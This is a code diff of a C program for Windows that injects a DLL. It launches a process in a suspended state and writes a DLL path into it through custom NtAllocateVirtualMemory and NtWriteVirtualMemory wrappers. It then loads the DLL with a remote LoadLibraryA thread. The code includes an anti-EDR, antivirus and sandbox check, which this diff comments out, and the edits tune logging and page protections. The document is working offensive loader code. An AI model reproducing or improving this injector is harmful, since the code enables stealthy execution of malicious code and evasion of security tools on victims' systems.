@@ -17,78 +17,76 @@ void StealthExec(HANDLE hProc, const char *dllN)
 
     if (!pLLoad)
     {
-        printf("[!] Failed to resolve LoadLibraryA.\n");
+        myDebug(DEBUG_ERROR, "Failed to resolve LoadLibraryA.");
         return;
     }
     else
     {
-        printf("[*] Successfully resolve LoadLibraryA.\n");
+        myDebug(DEBUG_SUCCESS, "Successfully resolve LoadLibraryA.");
     }
 
-    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
     if (status != 0)
     {
-        printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
+        myDebug(DEBUG_ERROR, "NtAllocateVirtualMemory failed! Status: 0x%lX", status);
         return;
     }
 
     if (memLoc == NULL)
     {
-        printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
+        myDebug(DEBUG_ERROR, "Memory allocation failed, BaseAddress is NULL.");
         return;
     }
     else
     {
-        printf("[*] Successfully allocate memory.\n");
+        myDebug(DEBUG_SUCCESS, "Successfully allocate memory.");
     }
 
     // Write DLL Path to Remote Process
     status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
     if (status != 0)
     {
-        printf("[!] Memory write failed (Err: 0x%lX).\n", status);
+        myDebug(DEBUG_ERROR, "Memory write failed (Err: 0x%lX).", status);
         return;
     }
     else
     {
-        printf("[*] Successfully write memory.\n");
+        myDebug(DEBUG_SUCCESS, "Successfully write memory.");
     }
 
     // Load Remote DLL
-    hThreadRemote = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL, NULL);
+    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
     if (!hThreadRemote)
     {
-        printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
+        myDebug(DEBUG_ERROR, "Thread creation failed. Err: %lu", GetLastError());
         return;
     }
-
-    DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000); // Wait for 5 seconds
-    if (waitResult == WAIT_TIMEOUT)
+    else
     {
-        printf("[!] Remote thread timed out!\n");
-        TerminateThread(hThreadRemote, 0); // Kill stuck thread
-        return;
-    }
-    else if (waitResult == WAIT_FAILED)
-    {
-        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
+        myDebug(DEBUG_INFO, "Thread creation succeed. Waiting 5 sec for thread to resume");
+        DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000); // Wait for 5 seconds
+        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
+        {
+            myDebug(DEBUG_ERROR, "WaitForSingleObject failed! Error: %lu", GetLastError());
+            TerminateThread(hThreadRemote, 0); // Kill stuck thread
+            CloseHandle(hThreadRemote);
+            return;
+        }
+        ResumeThread(hThreadRemote);
         CloseHandle(hThreadRemote);
-        return;
+        myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
     }
-    ResumeThread(hThreadRemote);
-    CloseHandle(hThreadRemote);
-
-    printf("[*] Successfully injected module\n");
+    return;
 }
 
 // Entry Function
 int main(int argc, char *argv[])
 {
     // Check For EDR/AV/Sandbox env
-    if (PerfomChecksEnv())
-    {
-        return 0;
-    }
+    // if (PerfomChecksEnv())
+    // {
+    //     return 0;
+    // }
 
     // If no DLL given, abort.
     if (argc != 2)
@@ -110,18 +108,20 @@ int main(int argc, char *argv[])
 
     if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
-        printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
+        myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
         return -1;
     }
 
-    printf("[*] Suspended %s created.\n", procName);
+    myDebug(DEBUG_INFO, "Suspended %s created.", procName);
 
     // Perform Injection
     StealthExec(pInfo.hProcess, dllPath);
 
     // Resume Execution
+    ResumeThread(pInfo.hThread);
     CloseHandle(pInfo.hProcess);
-    printf("[*] %s is now running.\n", procName);
+    CloseHandle(pInfo.hThread);
+    myDebug(DEBUG_INFO, "%s is now running.", procName);
 
     return 0;
 }
